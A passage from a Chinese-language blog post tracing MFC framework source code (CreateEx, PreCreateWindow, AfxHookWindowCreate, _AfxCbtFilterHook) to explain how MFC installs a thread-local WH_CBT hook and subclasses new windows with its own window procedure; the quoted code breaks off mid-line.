class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>hMenu<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>hInstance<span class=\"token punctuation\">,</span> cs<span class=\"token punctuation\">.</span>lpCreateParams<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_DEBUG</span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hWnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token function\">TRACE</span><span class=\"token punctuation\">(</span>traceAppMsg<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Warning: Window creation failed: GetLastError returns 0x%8.8X\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">AfxUnhookWindowCreate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token function\">PostNcDestroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// cleanup if CreateWindowEx fails too soon</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hWnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>hWnd <span class=\"token operator\">==</span> m_hWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// should have been set in send msg hook</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>跟进  <code>CreateEx</code>  函数，其一开始对一些信息进行了填充，这个信息传递给了  <code>PreCreateWindow</code>  函数。</p>\n<p><code>CREATESTRUCT</code>  结构体的介绍如下，此结构也是分为 A 和 W 版本。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">tagCREATESTRUCTA</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    LPVOID      lpCreateParams<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 创建参数</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    HINSTANCE   hInstance<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口模块的句柄</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    HMENU       hMenu<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口使用的菜单句柄</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    HWND        hwndParent<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 如果该窗口是一个子窗口，则为父窗口的句柄；如果该窗口是自有的，这个成员标识了所有者窗口；如果该窗口不是一个子窗口或自有窗口，这个成员是 NULL。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">int</span>         cy<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口的高度，单位是像素。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">int</span>         cx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口的宽度，单位是像素。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span>         y<span class=\"token punctuation\">;</span> <span class=\"token comment\">//y 坐标，如果窗口是一个子窗口，坐标是相对于父窗口的，否则，坐标是相对于屏幕原点的。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">int</span>         x<span class=\"token punctuation\">;</span> <span class=\"token comment\">//x 坐标</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    LONG        style<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口的样式</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    LPCSTR      lpszName<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口的名称</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    LPCSTR      lpszClass<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 窗口的类名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    DWORD       dwExStyle<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 扩展窗口样式</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span> CREATESTRUCTA<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>LPCREATESTRUCTA<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"precreatewindow-函数\"><a class=\"anchor\" href=\"#precreatewindow-函数\">#</a> PreCreateWindow 函数</h2>\n<p>跟进  <code>PreCreateWindow</code>  函数:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL <span class=\"token class-name\">CFrameWnd</span><span class=\"token operator\">::</span><span class=\"token function\">PreCreateWindow</span><span class=\"token punctuation\">(</span>CREATESTRUCT<span class=\"token operator\">&amp;</span> cs<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">.</span>lpszClass <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token function\">VERIFY</span><span class=\"token punctuation\">(</span><span class=\"token function\">AfxDeferRegisterClass</span><span class=\"token punctuation\">(</span>AFX_WNDFRAMEORVIEW_REG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">//_afxWndFrameOrView 在 AfxDeferRegisterClass 函数中被处理了。</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tcs<span class=\"token punctuation\">.</span>lpszClass <span class=\"token operator\">=</span> _afxWndFrameOrView<span class=\"token punctuation\">;</span>  <span class=\"token comment\">// COLOR_WINDOW background</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// 窗口风格的扩展</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cs<span class=\"token punctuation\">.</span>style <span class=\"token operator\">&amp;</span> FWS_ADDTOTITLE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\tcs<span class=\"token punctuation\">.</span>style <span class=\"token operator\">|=</span> FWS_PREFIXTITLE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tcs<span class=\"token punctuation\">.</span>dwExStyle <span class=\"token operator\">|=</span> WS_EX_CLIENTEDGE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">return</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们可以看见如果窗口名称为空则帮我去注册一个默认的窗口类。</p>\n<h2 id=\"afxenddeferregisterclass-函数\"><a class=\"anchor\" href=\"#afxenddeferregisterclass-函数\">#</a> AfxEndDeferRegisterClass 函数</h2>\n<p>其使用的是  <code>AfxDeferRegisterClass</code>  ，这是一个宏，其背后就是  <code>AfxEndDeferRegisterClass</code>  这个函数，跟进后就可以看到：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>这里知道了消息处理函数是  <code>DefWindowProc</code></p>\n<h2 id=\"afxhookwindowcreate-函数\"><a class=\"anchor\" href=\"#afxhookwindowcreate-函数\">#</a> AfxHookWindowCreate 函数</h2>\n<p>但通过阅读代码我们发现这个函数不是我们想要知道其是如何处理消息的函数，继续跟进，跟到  <code>CreateEx</code>  函数里面会有一个  <code>AfxHookWindowCreate</code>  函数，通过这个名字我们就知道什么意思了，其就表示在窗口创建之前挂了一个钩子（HOOK），跟进这个函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> AFXAPI <span class=\"token function\">AfxHookWindowCreate</span><span class=\"token punctuation\">(</span>CWnd<span class=\"token operator\">*</span> pWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t_AFX_THREAD_STATE<span class=\"token operator\">*</span> pThreadState <span class=\"token operator\">=</span> _afxThreadState<span class=\"token punctuation\">.</span><span class=\"token function\">GetData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_pWndInit <span class=\"token operator\">==</span> pWnd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\tpThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter <span class=\"token operator\">=</span> <span class=\"token operator\">::</span><span class=\"token function\">SetWindowsHookEx</span><span class=\"token punctuation\">(</span>WH_CBT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t_AfxCbtFilterHook<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">::</span><span class=\"token function\">GetCurrentThreadId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token function\">AfxThrowMemoryException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pWnd <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pWnd<span class=\"token operator\">-></span>m_hWnd <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// only do once</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_pWndInit <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// hook not already in progress</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tpThreadState<span class=\"token operator\">-></span>m_pWndInit <span class=\"token operator\">=</span> pWnd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到其挂钩子的函数是  <code>SetWindowsHookEx</code>  （其第一个参数是  <code>WH_CBT</code>  ，这是一个宏，其就是一个钩子，其表示可以监听窗口激活、产生、释放（关闭）、最小化、最大化或改变；那么在这些事件之前就会调用函数   <code>_AfxCbtFilterHook</code>  ，也就是第二个参数），相当于安装了一个  <code>WH_CBT</code>  类型的钩子函数  <code>_AfxCbtFilterHook</code>  。</p>\n<h2 id=\"_afxcbtfilterhook-函数\"><a class=\"anchor\" href=\"#_afxcbtfilterhook-函数\">#</a> _AfxCbtFilterHook 函数</h2>\n<p>我们查看  <code>_AfxCbtFilterHook</code>  函数:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LRESULT CALLBACK</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">_AfxCbtFilterHook</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> code<span class=\"token punctuation\">,</span> WPARAM wParam<span class=\"token punctuation\">,</span> LPARAM lParam<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t_AFX_THREAD_STATE<span class=\"token operator\">*</span> pThreadState <span class=\"token operator\">=</span> _afxThreadState<span class=\"token punctuation\">.</span><span class=\"token function\">GetData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>code <span class=\"token operator\">!=</span> HCBT_CREATEWND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token comment\">// wait for HCBT_CREATEWND just pass others on...</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token function\">CallNextHookEx</span><span class=\"token punctuation\">(</span>pThreadState<span class=\"token operator\">-></span>m_hHookOldCbtFilter<span class=\"token punctuation\">,</span> code<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\twParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>lParam <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tLPCREATESTRUCT lpcs <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>LPCBT_CREATEWND<span class=\"token punctuation\">)</span>lParam<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>lpcs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>lpcs <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tCWnd<span class=\"token operator\">*</span> pWndInit <span class=\"token operator\">=</span> pThreadState<span class=\"token operator\">-></span>m_pWndInit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tBOOL bContextIsDLL <span class=\"token operator\">=</span> afxContextIsDLL<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pWndInit <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>lpcs<span class=\"token operator\">-></span>style <span class=\"token operator\">&amp;</span> WS_CHILD<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>bContextIsDLL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// Note: special check to avoid subclassing the IME window</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_afxDBCS<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token comment\">// check for cheap CS_IME style first...</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">GetClassLong</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>HWND<span class=\"token punctuation\">)</span>wParam<span class=\"token punctuation\">,</span> GCL_STYLE<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> CS_IME<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">goto</span> lCallNextHook<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token comment\">// get class name of the window that is being created</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\tLPCTSTR pszClassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\tTCHAR szClassName<span class=\"token punctuation\">[</span><span class=\"token function\">_countof</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ime\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">DWORD_PTR</span><span class=\"token punctuation\">(</span>lpcs<span class=\"token operator\">-></span>lpszClass<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\t\tpszClassName <span class=\"token operator\">=</span> lpcs<span class=\"token operator\">-></span>lpszClass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\t\tszClassName<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>push<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>disable<span class=\"token operator\">:</span> <span class=\"token number\">4302</span><span class=\"token punctuation\">)</span> </span><span class=\"token comment\">// 'type cast' : truncation from 'LPCSTR' to 'ATOM'</span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t<span class=\"token function\">GlobalGetAtomName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ATOM<span class=\"token punctuation\">)</span>lpcs<span class=\"token operator\">-></span>lpszClass<span class=\"token punctuation\">,</span> szClassName<span class=\"token punctuation\">,</span> <span class=\"token function\">_countof</span><span class=\"token punctuation\">(</span>szClassName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">warning</span><span class=\"token punctuation\">(</span>pop<span class=\"token punctuation\">)</span></span></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t\t\tpszClassName <span class=\"token operator\">=</span> szClassName<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t\t<span class=\"token comment\">// a little more expensive to test this way, but necessary...</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">::</span><span class=\"token function\">AfxInvariantStrICmp</span><span class=\"token punctuation\">(</span>pszClassName<span class=\"token punctuation\">,</span> <span class=\"token function\">_T</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">goto</span> lCallNextHook<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>wParam <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// should be non-NULL HWND</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\tHWND hWnd <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>HWND<span class=\"token punctuation\">)</span>wParam<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\tWNDPROC oldWndProc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pWndInit <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t<span class=\"token function\">AFX_MANAGE_STATE</span><span class=\"token punctuation\">(</span>pWndInit<span class=\"token operator\">-></span>m_pModuleState<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t<span class=\"token comment\">// the window should not be in the permanent map at this time</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CWnd</span><span class=\"token operator\">::</span><span class=\"token function\">FromHandlePermanent</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\t<span class=\"token comment\">// connect the HWND to pWndInit...</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t\tpWndInit<span class=\"token operator\">-></span><span class=\"token function\">Attach</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t\t<span class=\"token comment\">// allow other subclassing to occur first</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t\tpWndInit<span class=\"token operator\">-></span><span class=\"token function\">PreSubclassWindow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t\t\tWNDPROC <span class=\"token operator\">*</span>pOldWndProc <span class=\"token operator\">=</span> pWndInit<span class=\"token operator\">-></span><span class=\"token function\">GetSuperWndProcAddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t\t\t<span class=\"token function\">ASSERT</span><span class=\"token punctuation\">(</span>pOldWndProc <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t\t\t<span class=\"token comment\">// subclass the window with standard AfxWndProc</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t\t\tWNDPROC afxWndProc <span class=\"token operator\">=</span> <span class=\"token function\">AfxGetAfxWndProc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t\toldWndProc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>WNDPROC<span class=\"token punctuation\">)</span><span class=\"token function\">SetWindowLongPtr</span><span class=\"token punctuation\">(</span>hWnd<span class=\"token punctuation\">,</span> GWLP_WNDPROC<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">(</span>DWORD_PTR<span class=\"token punctuation\">)</span>afxWndProc<span class=\"token 